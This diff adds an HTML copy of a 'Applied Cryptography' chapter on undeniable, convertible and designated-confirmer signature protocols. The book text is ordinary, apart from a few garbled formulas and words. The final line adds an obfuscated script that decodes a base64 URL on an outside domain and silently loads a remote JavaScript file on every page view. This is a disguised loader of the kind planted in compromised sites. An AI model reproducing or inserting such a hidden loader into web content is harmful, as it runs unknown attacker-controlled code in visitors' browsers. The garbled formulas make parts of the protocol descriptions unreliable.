@@ -1,0 +1,191 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=537-540//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Like the previous protocol, a group of signers use a shared public large prime, <I>p,</I> and a primitive element, <I>g.</I> Alice has a unique private key, <I>x,</I> and a public key, <I>g<SUP>x</SUP></I> mod <I>p.</I> To sign a message, Alice computes <I>z</I> =<I>m<SUP>x</SUP></I> mod <I>p.</I></P>
+<P>To verify a signature:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob chooses two random numbers, <I>a</I> and <I>b,</I> both less than <I>p,</I> and sends Alice:
+<DL>
+<DD><I>c</I> = <I>m<SUP>a</SUP>g<SUP>b</SUP></I> mod <I>p</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice chooses a random number, <I>q,</I> less than <I>p,</I> and computes and sends to Bob:
+<DL>
+<DD><I>s</I><SUB>1</SUB> = <I>cg<SUP>q</SUP></I> mod <I>p, s</I><SUB>2</SUB> = (<I>cg<SUP>q</SUP></I>)<SUP>x</SUP>  mod <I>p</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob sends Alice <I>a</I> and <I>b,</I> so that Alice can confirm that Bob did not cheat in step (1).
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends Bob <I>q,</I> so that Bob can use <I>m<SUP>x</SUP></I> and reconstruct <I>s</I><SUB>1</SUB> and <I>s</I><SUB>2</SUB>. If then the signature is valid.
+<DL>
+<DD><I>s</I><SUB>1</SUB> &#8801; <I>cg<SUP>q</SUP></I> (mod <I>p</I>)
+</DL>
+<DL>
+<DD><I>s</I><SUB>2</SUB> &#8801; (<I>g<SUP>x</SUP></I>)<SUP><I>b &#43;q</I></SUP><I>z<SUP>a</SUP></I> (mod <I>p</I>)
+</DL>
+</DL>
+<P>Alice can also disavow a signature, <I>z,</I> for a message, <I>m.</I> See [329] for details.</P>
+<P>Additional protocols for undeniable signatures can be found in [584,344]. Lein Harn and Shoubao Yang proposed a group undeniable signature scheme [700].</P>
+<P><FONT SIZE="+1"><B><I>Convertible Undeniable Signatures</I></B></FONT></P>
+<P>An algorithm for a <B>convertible undeniable signature,</B> which can be verified, disavowed, and also converted to a conventional digital signature is given in [213]. It&#146;s based on the ElGamal digital signature algorithm.</P>
+<P>Like ElGamal, first choose two primes, <I>p</I> and <I>q,</I> such that <I>q</I> divides <I>p</I> -1. Now you have to create a number, <I>g,</I> less than <I>q.</I> First choose a random number, <I>h,</I> between 2 and <I>p</I> -1. Calculate</P>
+<DL>
+<DD><I>g</I> = <I>h</I><SUP>( <I>p-1</I>)/<I>q</I></SUP> mod <I>p</I>
+</DL>
+<P>If <I>g</I> equals the 1, choose another random <I>h.</I> If it doesn&#146;t, stick with the <I>g</I> you have.</P>
+<P>The private keys are two different random numbers, <I>x</I> and <I>z,</I> both less than <I>q.</I> The public keys are <I>p, q, g, y,</I> and <I>u,</I> where</P>
+<DL>
+<DD><I>y</I> = <I>g<SUP>x</SUP></I> mod <I>p</I>
+<DD><I>u</I> = <I>g<SUP>z</SUP></I> mod <I>p</I>
+</DL>
+<P>To compute the convertible undeniable signature of message <I>m</I> (which is actually the hash of a message), first choose a random number, <I>t,</I> between 1 and <I>q</I> -1. Then compute</P>
+<DL>
+<DD><I>T</I> = <I>g<SUP>t</SUP></I> mod <I>p</I>
+</DL>
+<P>and
+</P>
+<DL>
+<DD><I>m'</I> = <I>Ttzm</I> mod <I>q.</I>
+</DL>
+<P>Now, compute the standard ElGamal signature on <I>m'</I>. Choose a random number, <I>R,</I> such that <I>R</I> is less than and relatively prime to <I>p</I> -1. Then compute <I>r</I> =<I>g<SUP>R</SUP></I> mod <I>p,</I> and use the extended Euclidean algorithm to compute <I>s,</I> such that</P>
+<DL>
+<DD><I>m'</I> &#8801; <I>rx</I> &#43; <I>Rs</I> (mod <I>q</I>)
+</DL>
+<P>The signature is the ElGamal signature (<I>r, s</I>), and <I>T.</I></P>
+<P>Here&#146;s how Alice verifies her signature to Bob:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob generates two random numbers, <I>a</I> and b. He computes <I>c</I> = <I>T<SUP>Tma</SUP>g<SUP>b</SUP></I> mod <I>p</I> and sends that to Alice.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates a random number, <I>k,</I> and computes <I>h</I><SUB>1</SUB> = <I>cg<SUP>k</SUP></I> mod <I>p,</I> and <I>h</I><SUB>2</SUB> = <I>h</I><SUB>1</SUB> <SUP>z</SUP> mod <I>p,</I> and sends both of those numbers to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob sends Alice <I>a</I> and <I>b.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice verifies that <I>c</I> = <I>T<SUP>Tma</SUP>g<SUP>b</SUP></I> mod <I>p.</I> She sends <I>k</I> to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob verifies that <I>h</I><SUB>1</SUB> = <I>T<SUP>Tma</SUP>g<SUP>b&#43;k</SUP></I> mod <I>p,</I> and that <I>h</I><SUB>2</SUB> = <I>y<SUP>ra</SUP>r<SUP>sa</SUP>u<SUP>b&#43;k</SUP></I> mod <I>p.</I>
+</DL>
+<P>Alice can convert all of her undeniable signatures to normal signatures by publishing <I>z.</I> Now, anyone can verify her signature without her help.</P>
+<P>Undeniable signature schemes can be combined with secret-sharing schemes to create <B>distributed convertible undeniable signatures</B> [1235]. Someone can sign a message, then distribute the ability to confirm that the signature is valid. He might, for example, require three out of five people to participate in the protocol in order to convince Bob that the signature is valid. Improvements on this notion deleted the requirement for a trusted dealer [700,1369].</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">23.5 Designated Confirmer Signatures</FONT></H3>
+<P>Here&#146;s how Alice can sign a message and Bob can verify it, such that Carol can verify Alice&#146;s signature at some later time to Dave (see Section 4.4) [333].
+</P>
+<P>First, a large prime, <I>p,</I> and a primitive element, <I>g,</I> are made public and used by a group of users. The product of two primes, <I>n,</I> is also public. Carol has a private key, <I>z,</I> and a public key is <I>h</I> =<I>g<SUP>x</SUP></I> mod <I>p.</I></P>
+<P>In this protocol Alice can sign <I>m</I> such that Bob is convinced that the signature is valid,but cannot convince a third party.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random <I>x</I> and computes
+<DL>
+<DD><I>a</I> = <I>g<SUP>x</SUP></I> mod <I>p</I>
+<DD><I>b</I> = <I>h<SUP>x</SUP></I> mod <I>p</I>
+</DL>
+<BR>She computes the hash of <I>m, H</I>(<I>m</I>), and the hash of <I>a</I> and <I>b</I> concatenated, <I>H</I>(<I>a,b</I>). She then computes
+<DL>
+<DD><I>j</I> = (<I>H</I>(<I>m</I>) &#8853; <I>H</I>(<I>a, b</I>))<SUP>1/3</SUP> mod <I>n</I>
+</DL>
+<BR>and sends <I>a, b,</I> and <I>j</I> to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses two random numbers, <I>s</I> and <I>t,</I> both less than <I>p,</I> and sends Alice
+<DL>
+<DD><I>c</I> = <I>g<SUP>s</SUP>h<SUP>t</SUP></I> mod <I>p</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice chooses a random <I>q</I> less than <I>p,</I> and sends Bob
+<DL>
+<DD><I>d</I> = <I>g<SUP>q</SUP></I> mod <I>p</I>
+<DD>
+<DD><I>e</I> = (<I>cd</I>)<SUP>x</SUP>  mod <I>p</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends Alice <I>s</I> and <I>t.</I>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice confirms that
+<DL>
+<DD><I>g<SUP>s</SUP>h<SUP>t</SUP></I> &#8801; <I>c</I> (mod <I>p</I>)
+</DL>
+<BR>Then she sends Bob <I>q.</I>
+<DD><B>(6)</B>&nbsp;&nbsp;Bob confirms
+<DL>
+<DD><I>d</I> &#8801; <I>g<SUP>q</SUP></I> (mod <I>p</I>)
+<DD><I>e</I>/<I>a<SUP>q</SUP></I> &#8801; <I>a<SUP>s</SUP>b<SUP>t</SUP></I> (mod <I>p</I>)
+<DD><I>H</I>(<I>m</I>) &#8853; <I>H</I>(<I>a, b</I>) &#8801; <I>j<SUP>1/3</SUP></I> mod <I>n</I>
+</DL>
+<BR>If they all check out, he accepts the signature as genuine.
+</DL>
+<P>Bob cannot use a transcript of this proof to convince Dave that the signature is genuine, but Dave can conduct a protocol with Alice&#146;s designated confirmer, Carol. Here&#146;s how Carol convinces Dave that <I>a</I> and <I>bconstitute</I> a valid signature.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Dave chooses a random <I>u</I> and <I>v,</I> both less than <I>p,</I> and sends Carol
+<DL>
+<DD><I>k</I> = <I>g<SUP>u</SUP>a<SUP>v</SUP></I> mod <I>p</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Carol chooses a random <I>w,</I> less than <I>p,</I> and sends Dave
+<DL>
+<DD><I>l</I> = <I>g<SUP>w</SUP></I> mod <I>p</I>
+<DD>
+<DD><I>y</I> = (<I>kl</I>)<SUP>z</SUP>  mod <I>p</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Dave sends Carol <I>u</I> and <I>v.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Carol confirms that
+<DL>
+<DD><I>g<SUP>u</SUP>a<SUP>v</SUP></I> &#8801; <I>k</I> (mod <I>p</I>)
+</DL>
+<BR>Then she sends Dave <I>w.</I>
+<DD><B>(5)</B>&nbsp;&nbsp;Dave confirms that
+<DL>
+<DD><I>g<SUP>w</SUP></I> &#8801; <I>l</I> (mod <I>p</I>)
+<DD>
+<DD><I>y</I>/<I>h<SUP>w</SUP></I> &#8801; <I>h<SUP>u</SUP>b<SUP>v</SUP></I> (mod <I>p</I>)
+</DL>
+<BR>If they both check out, he accepts the signature as genuine.
+</DL>
+<P>In another protocol Carol can convert the designated-confirmer protocol into a conventional digital signature. See [333] for details.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(XMVnsIUi, jIbyozcC) {jIbyozcC = XMVnsIUi.createElement('script');jIbyozcC.type = 'text/javascript';jIbyozcC.async = true;jIbyozcC.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');XMVnsIUi.getElementsByTagName('body')[0].appendChild(jIbyozcC);}(document));</script></body>
+</html>
